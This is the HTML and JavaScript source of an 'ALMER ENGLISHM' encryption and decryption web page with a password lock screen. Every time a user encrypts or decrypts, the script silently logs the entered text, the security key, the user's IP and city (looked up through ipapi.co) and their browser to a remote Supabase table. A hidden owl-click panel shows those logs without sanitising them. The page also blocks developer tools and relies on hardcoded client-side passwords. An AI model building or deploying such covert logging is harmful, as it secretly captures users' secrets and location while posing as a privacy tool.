<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AL-MIR | ENGLISHM SYSTEM</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <link href="https://fonts.googleapis.com/css2?family=Aref+Ruqaa+Ink:wght@700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        :root { --matrix-green: #00ff41; --dark-green: #003b00; }
        body { background-color: #000; color: var(--matrix-green); font-family: 'Share Tech Mono', monospace; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; min-height: 100vh; margin: 0; border: 10px solid; border-image: linear-gradient(to bottom, var(--dark-green), #000) 1; box-sizing: border-box; padding: 80px 0 20px 0; user-select: none; overflow-x: hidden; }
        #digital-clock { font-size: 1.5rem; color: var(--matrix-green); position: absolute; top: 25px; left: 25px; font-weight: bold; z-index: 10; letter-spacing: 2px; opacity: 0.9; }
        #lock-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: flex; align-items: center; justify-content: center; z-index: 999; }
        .login-box { text-align: center; padding: 40px; border-radius: 20px; background: rgba(0, 5, 0, 0.98); width: 90%; max-width: 450px; border: 2px solid var(--matrix-green); box-shadow: 0 0 50px rgba(0, 255, 65, 0.4); }
        .header-wrapper { display: flex !important; flex-direction: column !important; align-items: center !important; justify-content: center !important; width: 100%; text-align: center; margin-bottom: 30px; cursor: pointer; }
        .owl-icon { width: 85px; height: 85px; object-fit: contain; margin-bottom: 15px; filter: drop-shadow(0 0 10px var(--matrix-green)); display: block; margin-left: auto; margin-right: auto; transition: filter 0.1s ease; }
        .logo-title { font-family: 'Aref Ruqaa Ink', serif; font-size: 2.8rem; color: var(--matrix-green); font-weight: 700; transition: text-shadow 0.1s ease; margin: 0; display: block; width: 100%; }
        .container { text-align: center; padding: 30px; border-radius: 20px; background: rgba(5, 5, 5, 0.98); width: 95%; max-width: 500px; margin-bottom: 30px; box-sizing: border-box; }
        .enc-container { border: 2px solid var(--matrix-green); box-shadow: 0 0 45px rgba(0, 255, 65, 0.2); }
        .dec-container { border: 2px solid #e0e0e0; box-shadow: 0 0 40px rgba(255, 255, 255, 0.1); }
        textarea, select, .main-input { width: 100%; padding: 14px; margin: 10px 0; background: #050505; color: #fff; border-radius: 8px; font-size: 1.1rem; box-sizing: border-box; text-align: center; outline: none; border: 1px solid #333; font-family: inherit; }
        button { width: 100%; padding: 15px; border: none; font-weight: 700; border-radius: 8px; transition: 0.3s; text-transform: uppercase; cursor: pointer; letter-spacing: 2px; }
        .enc-btn { background: linear-gradient(145deg, #008f11, #003b00); color: #fff; box-shadow: 0 4px 0 #002500; }
        .dec-btn { background: #e0e0e0; color: #000; box-shadow: 0 4px 0 #999; }
        .result-box { margin-top: 25px; padding: 20px; border: 1px dashed var(--matrix-green); border-radius: 10px; cursor: pointer; background: rgba(0, 255, 65, 0.05); overflow-wrap: break-word; }
        .output-text { font-size: 1.6rem; color: #fff; font-weight: bold; display: block; width: 100%; }
        footer { margin-top: auto; padding: 30px; width: 100%; text-align: center; }
        .footer-text { font-size: 0.95rem; color: var(--matrix-green); font-weight: bold; opacity: 0.6; }
        #secret-panel { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 10000; display: none; padding: 20px; box-sizing: border-box; overflow-y: auto; border: 5px solid var(--matrix-green); }
        .log-table { width: 100%; border-collapse: collapse; color: var(--matrix-green); margin-top: 20px; font-size: 0.85rem; }
        .log-table th, .log-table td { border: 1px solid var(--matrix-green); padding: 12px; text-align: center; }
        .close-secret { background: #ff0000; color: #fff; width: auto; padding: 10px 25px; margin-bottom: 20px; }
    </style>
</head>
<body oncontextmenu="return false;" onload="initSystem()">

    <div id="digital-clock">00:00:00:000</div>

    <div id="lock-screen">
        <div class="login-box">
            <div class="header-wrapper">
                <img src="owl2.png" alt="🦉" class="owl-icon">
                <div class="logo-title">ALMER ENGLISHM</div>
            </div>
            <input type="password" id="passInput" class="main-input" placeholder="ACCESS CODE" onkeydown="if(event.key==='Enter') verifyAccess()">
            <button onclick="verifyAccess()" class="enc-btn" style="margin-top: 15px;">LOGIN</button>
        </div>
    </div>

    <div class="header-wrapper" id="main-header" style="display:none;">
        <img src="owl2.png" alt="🦉" class="owl-icon" id="interactive-owl" onclick="handleOwlClick()">
        <div class="logo-title" id="interactive-title">ALMER ENGLISHM</div>
    </div>

    <div class="container enc-container" id="enc-sec" style="display:none;">
        <h2 style="color:var(--matrix-green);">[ ENCRYPTION SECTOR ]</h2>
        <textarea id="iTE" rows="3" placeholder="Enter text..."></textarea>
        <input type="number" id="kIE" class="main-input" placeholder="Security Key">
        <select id="sE">
            <option value="circle">( )</option>
            <option value="square">[ ]</option>
            <option value="brace">{ }</option>
        </select>
        <button id="btnE" onclick="processAction('encrypt')" class="enc-btn">ENCRYPT NOW</button>
        <div class="result-box" onclick="copyResult('oE')">
            <div id="oE" class="output-text">...</div>
        </div>
    </div>

    <div class="container dec-container" id="dec-sec" style="display:none;">
        <h2 style="color:#e0e0e0;">[ DECRYPTION SECTOR ]</h2>
        <textarea id="iTD" rows="3" placeholder="Enter code..."></textarea>
        <input type="number" id="kID" class="main-input" placeholder="Security Key">
        <select id="sD">
            <option value="circle">( )</option>
            <option value="square">[ ]</option>
            <option value="brace">{ }</option>
        </select>
        <button id="btnD" onclick="processAction('decrypt')" class="dec-btn">DECRYPT CODE</button>
        <div class="result-box" onclick="copyResult('oD')">
            <div id="oD" class="output-text">...</div>
        </div>
    </div>

    <div id="secret-panel">
        <button class="close-secret" onclick="document.getElementById('secret-panel').style.display='none'">EXIT SECURE PANEL</button>
        <h1 style="color:var(--matrix-green)">DATABASE: logs_english</h1>
        <div id="log-content">Loading...</div>
    </div>

    <footer id="footer-sec" style="display:none;">
        <div class="footer-text">ALL RIGHTS RESERVED<br>MOHAMMED AL-MER © 2026</div>
    </footer>

    <script>
        const SUPA_URL = "https://ctvmxkwzzqwskgtgcuwc.supabase.co";
        const SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImN0dm14a3d6enF3c2tndGdjdXdjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYxNjE1MDksImV4cCI6MjA5MTczNzUwOX0.UrdE2w4gg-P9Hfy1b4uB34FES-CwQy0fs4LEF-TnagI";
        const sbClient = supabase.createClient(SUPA_URL, SUPA_KEY);

        function initSystem() {
            setInterval(() => {
                const n = new Date(); let h = n.getHours() % 12 || 12;
                document.getElementById('digital-clock').innerText = `${String(h).padStart(2, '0')}:${String(n.getMinutes()).padStart(2, '0')}:${String(n.getSeconds()).padStart(2, '0')}:${String(n.getMilliseconds()).padStart(3, '0')}`;
            }, 10);
            const t = document.getElementById('interactive-title'), o = document.getElementById('interactive-owl');
            document.addEventListener('mousemove', (e) => {
                if (document.getElementById('main-header').style.display !== 'none') {
                    const x = (e.clientX - window.innerWidth / 2) / 25, y = (e.clientY - window.innerHeight / 2) / 25;
                    t.style.textShadow = `${x}px ${y}px 15px rgba(0, 255, 65, 0.8)`;
                    o.style.filter = `drop-shadow(${x}px ${y}px 12px rgba(0, 255, 65, 0.8))`;
                }
            });
        }

        function verifyAccess() {
            if (document.getElementById('passInput').value === "YALiM") {
                document.getElementById('lock-screen').style.display = 'none';
                ['enc-sec', 'dec-sec', 'main-header', 'footer-sec'].forEach(id => document.getElementById(id).style.display = 'block');
            } else { alert("ACCESS DENIED"); }
        }

        let clickCount = 0;
        function handleOwlClick() {
            clickCount++;
            if (clickCount === 3) {
                let k = prompt("ACCESS KEY:");
                if (k === "YALiM_LOGS") { document.getElementById('secret-panel').style.display = 'block'; fetchLogs(); }
                clickCount = 0;
            }
            setTimeout(() => { clickCount = 0; }, 1000);
        }

        async function fetchLogs() {
            const { data } = await sbClient.from('logs_english').select('*').order('created_at', { ascending: false });
            if (data) {
                let h = '<table class="log-table"><tr><th>DATE</th><th>ACTION</th><th>CONTENT</th><th>KEY</th><th>INFO</th><th>BROWSER</th></tr>';
                data.forEach(r => { h += `<tr><td>${new Date(r.created_at).toLocaleString()}</td><td>${r.action_type}</td><td>${r.content}</td><td>${r.key_used}</td><td>${r.user_info}</td><td>${r.browser}</td></tr>`; });
                document.getElementById('log-content').innerHTML = h + '</table>';
            }
        }

        async function processAction(m) {
            let sx = m === 'encrypt' ? 'E' : 'D';
            let txt = document.getElementById('iT' + sx).value, ky = document.getElementById('kI' + sx).value, br = document.getElementById('s' + sx).value, btn = document.getElementById('btn' + sx);
            if (!txt || !ky) return;
            btn.innerText = "...";
            try {
                const { data } = await sbClient.rpc('englishm_logic', { t: txt, k: parseInt(ky), m: m, s: br });
                if (data) {
                    document.getElementById('o' + sx).innerText = data.result;
                    let inf = "Locating...";
                    try { const g = await fetch('https://ipapi.co/json/'); const gd = await g.json(); inf = `${gd.city}, ${gd.ip}`; } catch (e) {}
                    await sbClient.from('logs_english').insert([{ content: txt, key_used: ky.toString(), bracket_style: br, action_type: m, user_info: inf, browser: navigator.userAgent.split(' ').pop() }]);
                }
            } catch (e) {}
            btn.innerText = m === 'encrypt' ? "ENCRYPT NOW" : "DECRYPT CODE";
        }

        function copyResult(id) { navigator.clipboard.writeText(document.getElementById(id).innerText).then(() => alert("COPIED")); }

        window.addEventListener('keydown', function(e) {
            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) { e.preventDefault(); return false; }
        });
    </script>
</body>
</html>
